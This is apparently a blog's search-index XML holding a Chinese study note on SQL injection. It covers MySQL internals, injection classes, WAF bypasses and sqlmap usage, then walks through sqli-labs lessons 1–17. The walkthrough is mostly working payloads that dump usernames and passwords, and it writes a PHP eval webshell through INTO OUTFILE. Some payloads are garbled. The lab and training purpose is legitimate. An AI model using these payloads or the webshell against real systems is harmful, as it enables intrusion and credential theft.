<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入知识点总结+靶场笔记</title>
      <link href="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/"/>
      <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p><p>​     在schemata表中，schema_name字段用来存储数据库名。</p><p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p><p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p>利用Navicat for MySQL查看结构。</p><h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a><strong>增删改查</strong></h5><p><strong>SELECT</strong></p><p>SELECT 列名称 FROM 表名称 WHERE 字段1=‘条件</p><p>一’ AND 字段2=‘条件2’</p><p><strong>INSERT</strong></p><p>INSERT INTO table_name(列1…列2) VALUES(值1….值2….)</p><p><strong>UPDATE</strong></p><p>UPDATE 表名称 SET 列名称=新值 WHERE 列名称=某值</p><p><strong>DELETE</strong></p><p>DELETE FROM 表名称 WHERE 列名称=值</p><h5 id="Mysql常用的几种函数："><a href="#Mysql常用的几种函数：" class="headerlink" title="Mysql常用的几种函数："></a><strong>Mysql常用的几种函数：</strong></h5><p>user():查看当前Mysql登录用户名；</p><p>database():查看当前使用Mysql数据库名；</p><p>version():查看当前Mysql版本。</p><p>扩展limit关键字 limit m,n 从m行开始，到m+n行。</p><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h5><ul><li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li><li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li></ul><p>例如：select * from articles where id -id ;</p><p>使用内联注释注入：select * from articles where id=-1 /<em>!union\</em>/ /*!select*/ 1,2,3,4</p><h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul><li>and 1=1/and 1=2（整型）</li><li>随机输入(整型)</li><li>-1/+1回显上下页</li><li>单引号（字符型/整型）</li><li>and sleep(5)(判断页面返回时间)</li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><p><strong>根据语法：</strong></p><p><strong>1.可联合查询注入：</strong></p><p>注入前提：能使用union , 页面必须有显示位</p><p>注入方法：</p><ul><li>找到注入点并判断闭合字符</li><li>判断数据库类型</li><li>猜解列数，爆显示位</li><li>得到基本信息（如数据库名、数据库版本等）</li><li>猜解表名</li><li>得到列名</li><li>得到列值</li></ul><p><strong>2.报错型注入</strong></p><p>注入前提：页面没有显示位，源码使用了echo mysql_error输出了错误信息</p><p>​                    注入速度快，语句复杂、不能使用group_concat(),只能使用limit依次猜解</p><p>注入方法：</p><ul><li>floor报错注入</li></ul><p>​      select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</p><ul><li><p>updatexml报错注入</p></li><li><p>extractvalue报错注入</p></li></ul><p><strong>3.布尔型注入</strong></p><p>注入前提：页面存在注入但是没有显示位且源码没有使用echo mysql_error()输出报错信息。</p><p>注入方法:</p><ul><li>?id=1 and (注入语句) # 根据返回结果是否相同来得到数据</li><li>主要利用了length()、ascii()、substr()得到结果</li></ul><p><strong>4.基于时间延迟注入</strong></p><p>根据页面返回时间的不同来得到数据</p><h5 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h5><p>题目地址：<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p><p>做题步骤：检测注入=&gt;了解过滤=&gt;获取数据</p><h5 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h5><p><code>select username,password FROM  users order by 1 asc;</code></p><p>1.直接加报错注入</p><p>2.Rand()方式</p><p>3.And payload时间盲注方式</p><p>4.其他方式</p><p><strong>5.多语句查询(堆叠查询）</strong></p><p>注入前提：只在MSSQL数据库存在</p><p>注入方法：一个SQL语句后跟分号后再跟一个语句即可执行两个语句。</p><p><strong>根据类型：</strong></p><ul><li>整型</li><li>字符串型</li><li>搜索型</li></ul><h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul><li>GET</li><li>POST</li><li>X-Forward-For</li><li>Cookie</li><li>User-Agent</li></ul><h4 id="SQL注入绕过机制"><a href="#SQL注入绕过机制" class="headerlink" title="SQL注入绕过机制"></a>SQL注入绕过机制</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>​         如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如：and过滤。当然这种过滤只是发现关键字出现。并不会对关键字进行处理。<br>​    通过修改关键字内字母大小写来绕过过滤措施。例如： AnD 1=1</p><p>​     例如，在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order,可以使用OrdER来进行绕过。</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p><p>例如：过滤了union，我们可以使用ununionion进行绕过。</p><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p><img src="\SQL注入知识点总结-靶场笔记\QQ截图20200206143207.png" style="zoom:80%;" /><hr><h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206143914.png" alt=""></p><h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p><p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p><p>sqlmap支持五种不同的注入模式：</p><ul><li>基于布尔的盲注：既可以根据返回页面判断条件真假的注入。</li></ul><p>​        向数据库发送true或false这样的问题，并根据应用程序赶回的信息判断结果、这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。</p><ul><li>基于时间的盲注:即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入：可以使用union的情况下的注入</li><li>堆查询注入：可以同时执行多条语句的执行时注入</li></ul><p><strong>sqlmap常用参数</strong></p><ul><li><p>-h -help显示基本帮助信息</p></li><li><p>-hh 显示高级帮助信息并退出</p></li><li><p>-u指定url</p></li><li><p>-p指定参数</p></li><li><p>-D指定数据库</p></li><li><p>-T指定表</p></li><li><p>-C指定字段</p></li><li><p>–current-db当前数据库</p></li><li><p>–current-user当前用户</p></li><li><p>–dbs查询所有数据库</p></li><li><p>–tables查询所有表</p></li><li><p>–columns查询所有字段名</p></li><li><p>–dump查询记录</p></li><li><p>–techniques X(X=B布尔型，E报错型，U联合注入型，T延时型）</p></li></ul><h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p><p>?id=1’ or 1=1 %23</p><p>?id=1’ order by 3 %23  #字段数为3</p><p>?id=1’ union select 1,2,3 #显示位为2，3</p><p><strong>爆库名</strong></p><p>?id=1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23 </p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p><p><strong>爆表名</strong></p><p>?id=1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)%23 </p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p><p><strong>爆列名</strong></p><p>?id=1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’user’) %23 </p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p><p><strong>爆用户名和密码</strong></p><p>?id=1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23  </p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p><p><strong>使用sqlmap自动化探测</strong></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190036.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190557.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190649.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205192706.png" alt=""></p><h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p><p>构造同Less-1</p><h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p><p>构造同Less-1</p><h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p><p>构造同Less-01</p><h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p><p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select database()),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p><p><strong>爆表名</strong></p><p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p><p><strong>更换Limit后的数字即可查出其他表名</strong></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p><p><strong>爆user表列名</strong></p><p>?id=1’  union select count(*),1, concat(‘<del>‘,(select column_namefrom information_schema.tables where table_schema=’security’   and table_name=’users’ limit 0,1),’</del>‘,floor(rand()2)) as a from information_schema gruop by a %23</p><p><strong>爆username password内容</strong></p><p> ?id=1’union select count(<em>),1, concat(‘<del>‘,(select username from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p><p>?id=1’union select count(<em>),1, concat(‘<del>‘,(select password from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a  %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p><h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p><p>构造同上</p><h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206122518.png" alt=""></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206120820.png" alt=""></p><p>我们需要用到两个函数：</p><p><strong>load_file()：</strong>读取本地文件</p><p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p><p>我们首先判断注入点：</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206121046.png" alt=""></p><p>然后我们使用outfile函数将一句话木马写入文件。</p><pre class=" language-mysql"><code class="language-mysql">?id=-1')) union select 1,2,'<?php @eval($_POST["crow"]);?>' into outfile "D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php"</code></pre><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206123636.png" alt=""></p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p><p>之后我们使用中国菜刀连接即可。 </p><h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p><p>?id=1’ and (length(database())) = 8 %23 #数据库长度为8</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p><p>我们任意修改长度，页面不回显</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p><p><strong>爆库名</strong></p><p>?id=1’ and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</p><p>?id=1’and(ascii(substr((select database()),2,1)))=101 %23 #e</p><p>?id=1’and(ascii(substr((select database()),3,1)))=99 %23 #c</p><p>?id=1’ and (ascii(substr((select database()) ,4,1))) = 117 –+ #u</p><p>?id=1’ and (ascii(substr((select database()) ,5,1))) = 114 –+ #r</p><p>​    and (ascii(substr((select database()) ,6,1))) = 105 –+    #i</p><p> and (ascii(substr((select database()) ,7,1))) = 116 –+   #t</p><p>?id=1’ and (ascii(substr((select database()) ,8,1))) = 121 –+  #y</p><p><strong>爆表名长度</strong></p><p>?id=1’ and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</p><p>类推以上即可：</p><h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p>?id=1’ and sleep(5) %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p><p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p><p>接下来使用sqlmap自动化注入</p><p><strong>爆数据库名：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql --dbs --batch</code></pre><p><strong>爆表名：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security --tables --batch </code></pre><p><strong>爆列名</strong>：</p><pre><code> python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users --column --batch</code></pre><p><strong>爆内容 ：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code></pre><h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p>?id=1” and sleep(5) %23</p><p>同上</p><h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p><p>uname=admin’ and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p><p>uname=admin’ and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p><p>存在报错型注入，我们使用extractvalue()函数。</p><p><strong>爆数据库</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p><p><strong>爆表名</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p><p><strong>爆列名</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=’users’),0x7e))%23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p><p><strong>爆用户名密码</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p><p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p><p>sqlmap自动化注入：</p><p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p><h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p><p><strong>爆数据库名</strong>：</p><p>uname=admin” and extractvalue(1,concat(0x7e,(select database(),0x7e)))  “%23</p><p><strong>爆表名</strong>：</p><p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and “ </p><p><strong>爆列名</strong>：</p><p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’)))  and “<br><strong>爆用户名密码：</strong></p><p>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p><h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p><p>1’) union select count(<em>),concat_ws(‘~’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p>1’) union select count(<em>),concat_ws(‘:’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆表名</strong></p><p>‘) union select count(<em>),concat_ws(‘++’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆列名</strong></p><p>‘) union select count(<em>),concat_ws(‘+’,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆数据</strong></p><p>‘) union select count(<em>),concat_ws(‘;’,(select username from users limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p><p>过程同上。</p><h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p><p>admin’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) # </p><p>逐个判断即可；</p><h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p><p>使用延时注入</p><p>同上。</p><h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</p><p><strong>爆表名</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x5c),1))#submit=submit</p><p><strong>爆字段名</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username=’admin’)aa),0x5c),1))#submit=submit</p><p><strong>未完待续。。。。</strong></p><h5 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP危险函数总结</title>
      <link href="/2020/03/12/php-wei-xian-han-shu-zong-jie/"/>
      <url>/2020/03/12/php-wei-xian-han-shu-zong-jie/</url>
      
